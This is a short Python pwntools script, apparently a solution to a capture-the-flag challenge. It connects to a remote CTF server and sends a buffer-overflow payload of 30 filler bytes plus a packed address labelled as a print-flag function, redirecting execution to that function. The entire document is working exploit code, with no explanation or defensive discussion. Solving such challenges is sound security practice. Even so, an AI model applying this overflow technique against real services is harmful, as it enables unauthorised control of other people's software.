from pwn import *

#p=process("./offset")
p=remote("ctf.j0n9hyun.xyz", 3007)

p.recvline()

print_flag_1bit=0xd8
payload='A'*30+p32(print_flag_1bit)

p.sendline(payload)
p.interactive()
